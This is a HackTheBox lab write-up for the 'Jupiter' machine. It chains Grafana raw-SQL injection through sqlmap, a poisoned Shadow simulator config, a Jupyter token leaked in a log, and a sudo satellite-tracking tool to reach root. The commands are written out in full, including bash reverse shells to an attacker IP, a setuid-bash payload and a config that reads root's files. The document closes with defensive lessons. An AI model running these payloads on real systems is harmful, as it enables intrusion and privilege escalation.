---
title: "Jupiter"
date: 2023-07-08
type: docs
tags:
  - htb
  - linux
  - medium
  - vhost-fuzzing
  - grafana
  - postgresql
  - sqli
  - stacked-queries
  - sqlmap
  - shadow-simulator
  - writable-config
  - jupyter
  - pspy
  - sudo
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 22.04, nginx 1.18), **Difficulty:** Medium, **Released:** 2023-07-08, **IP:** `10.10.11.216` , `jupiter.htb`

</div>

<div class="callout callout-warning">

**Partial**

My notes cover the postgres shell and internal enumeration. The `juno`, `jovian`, and root steps are reconstructed from published writeups (0xdf, Eric Hogue) and marked.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. A vhost sweep finds `kiosk.jupiter.htb` running **Grafana**. Its `/api/ds/query` proxies raw SQL to PostgreSQL, and the `rawSql` field allows **stacked queries**.
2. `sqlmap --os-shell` on the captured request gives a shell as **`postgres`**.
3. `/dev/shm/network-simulation.yml` is world writable and consumed on a schedule by **`juno`** via the **Shadow** network simulator. Poison a `process` entry to run a reverse shell. Now **`juno`**.
4. `juno` can read `/opt/solar-flares/`, which holds the log for a **Jupyter Notebook** running as **`jovian`**. The log contains the auth token. Use it to run Python in the notebook. Now **`jovian`**.
5. `jovian` may `sudo /usr/local/bin/sattrack` (NOPASSWD). It reads `config.json` from the working directory and writes downloaded "TLE source" files to a path you choose, so point `tlesources` at `file:///root/root.txt` (or replace the binary, which `jovian` can also write). Root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| Grafana datasource | injected, no login needed |
| Jupyter token | from `/opt/solar-flares/*.log` |
| `user.txt` | `/home/juno/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Jupiter is a four hop box with a science theme, and every hop is "someone left a job running that trusts a file I can write". The Grafana SQLi is the interesting foothold: Grafana lets a dashboard send arbitrary SQL to a datasource, and if you can reach `/api/ds/query` unauthenticated (anonymous org access is on here) you have a Postgres shell. Then a **Shadow simulator** config in `/dev/shm`, a **Jupyter** token sitting in a log, and a **satellite tracking tool** run via `sudo` that downloads files to attacker chosen paths. It is a great box for the habit of running `pspy` and `ss -tlnp` the moment you land and asking "what runs this, and can I influence its input".

Related Grafana / datasource SQLi: unique here, but see [PC](/writeups/hackthebox/linux/easy/pc/) and [Usage](/writeups/hackthebox/linux/easy/usage/) for SQLi via a request file. Related writable config consumed by a cron: [Inject](/writeups/hackthebox/linux/easy/inject/), [Interface](/writeups/hackthebox/linux/medium/interface/), [mkingdom](/writeups/tryhackme/linux/easy/mkingdom/). Related Jupyter: [Weasel](/writeups/tryhackme/windows/hard/weasel/) (THM).

---

## Full Walkthrough

### Web, Grafana SQL injection

```bash
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -c \
  -u http://jupiter.htb/ -H "Host: FUZZ.jupiter.htb" --mc all --fs 178
```

```console
kiosk   [Status: 200, Size: 34390]
```

`kiosk.jupiter.htb` is Grafana with an anonymous "public" dashboard. Capture one of its panel queries:

```http
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
Content-Type: application/json

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},
"rawSql":"select name from moons where parent = 'Saturn' order by name desc;",
"format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":1223}],
"from":"now-6h","to":"now"}
```

<div class="callout callout-note">

**Why this is injectable**

Grafana's Postgres datasource sends `rawSql` to the database more or less verbatim (it is a feature, "raw editor mode"). There is no parameterisation because the panel author is trusted. But `/api/ds/query` here does not require auth, so *you* are the panel author. Postgres allows **stacked queries** (`; SELECT pg_sleep(5)--`), which is what makes `--os-shell` possible. Feed the whole request to sqlmap as a `-r` file.

</div>

```bash
sqlmap -r sql.req --batch --no-cast --level 1 --risk 1 --dbs
```

```console
Parameter: JSON rawSql ((custom) POST)
    Type: stacked queries
back-end DBMS: PostgreSQL
```

### Foothold, sqlmap os-shell

```bash
sqlmap -r sql.req --os-shell --threads=10
```

```console
os-shell> bash -c 'sh -i >& /dev/tcp/10.10.14.77/9001 0>&1'
```

Shell as **`postgres`**.

<div class="callout callout-note">

**How `--os-shell` works on Postgres**

sqlmap creates a function that runs `COPY (SELECT '') TO PROGRAM '<cmd>'` (or uses a UDF), which executes `<cmd>` as the database OS user. Postgres `COPY ... TO PROGRAM` requires superuser, and the Grafana datasource connects as one here, so it works.

</div>

### Internal enumeration

```console
$ ss -tlnp
127.0.0.1:8888   # Jupyter Notebook (token needed)
127.0.0.1:3000   # Grafana
127.0.0.1:5432   # postgres

$ ls -la /dev/shm
-rw-rw-rw- 1 juno juno ... /dev/shm/network-simulation.yml    # world writable
```

`pspy` shows `juno` running `shadow` against that YAML every couple of minutes.

<div class="callout callout-note">

**Beyond the recorded notes, juno then jovian then root**

**1. postgres to juno via Shadow.** `network-simulation.yml` defines hosts and the processes they run. Add or edit a `processes` entry so one host runs your payload:
```yaml
hosts:
  attacker:
    network_node_id: 0
    processes:
      - path: /bin/bash
        args: -c "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash"   # runs as juno
        start_time: 3s
```
Wait for the next run, then `/tmp/rootbash -p` gives a `juno` shell (or drop a reverse shell / SSH key). `user.txt` is in `/home/juno`.

**2. juno to jovian via Jupyter.** `juno` can read `/opt/solar-flares/`. The Jupyter server log there contains the URL with the token:
```bash
grep -r 'token=' /opt/solar-flares/*.log
```
Tunnel `8888` (chisel or SSH), open `http://127.0.0.1:8888/?token=<token>`, create a notebook, and run:
```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.77/9002 0>&1'")
```
The kernel runs as **`jovian`**.

**3. jovian to root via sattrack.**
```console
jovian@jupiter:~$ sudo -l
User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```
`sattrack` reads `config.json` from the current directory and downloads each URL in `tlesources` into `tlefilepath` / `outputdir`. Point a source at a local file and choose an output you want to read:
```json
{
  "tlefile": "/tmp/tle.txt",
  "tlepath": "/tmp/",
  "mapfile": "/usr/local/share/sattrack/map.json",
  "texturefile": "/usr/local/share/sattrack/earth.png",
  "tlesources": ["file:///root/root.txt"],
  "updatePeriod": 1000,
  ...
}
```
```bash
cd /tmp && sudo /usr/local/bin/sattrack
cat /tmp/root.txt        # or whatever the tle output path resolves to
```
Simpler still: `jovian` has write access to `/usr/local/bin/sattrack`, so overwrite it with a script and `sudo` it.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/juno/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Disable anonymous access on Grafana** and never expose a datasource that connects as a database superuser. Raw SQL mode plus anon access plus superuser is unauthenticated RCE.
- **`/dev/shm` and `/tmp` are shared.** Do not read job configs from world writable paths. Own the file as the job user with `0600`.
- **Do not log secrets.** The Jupyter token in a world-groupreadable log is the whole juno to jovian hop. Use `--IdentityProvider.token` from an env var and restrict log perms.
- **`sudo` on a tool that reads a config from CWD** is privesc. The tool should use a fixed absolute config path owned by root.
- **`pspy` and `ss -tlnp` first.** Three of the four hops here are invisible to `sudo -l` alone.

---

## Related Writeups

- **SQLi via a saved request / os-shell:** [PC](/writeups/hackthebox/linux/easy/pc/), [Usage](/writeups/hackthebox/linux/easy/usage/), [Monitored](/writeups/hackthebox/linux/medium/monitored/)
- **Writable config consumed by a scheduled job:** [Inject](/writeups/hackthebox/linux/easy/inject/), [Interface](/writeups/hackthebox/linux/medium/interface/), [mkingdom](/writeups/tryhackme/linux/easy/mkingdom/)
- **Token or secret sitting in a log / file:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/)
- **`sudo` on a tool that trusts CWD / its own config:** [Code](/writeups/hackthebox/linux/easy/code/), [Bagel](/writeups/hackthebox/linux/medium/bagel/)

## References

- HTB Jupiter (0xdf) <https://0xdf.gitlab.io/2023/10/21/htb-jupiter.html>
- HTB Jupiter (Eric Hogue) <https://erichogue.ca/2023/10/HTB/Jupiter>
- Shadow network simulator <https://shadow.github.io/>
- Grafana datasource proxy <https://grafana.com/docs/grafana/latest/developers/http_api/data_source/>
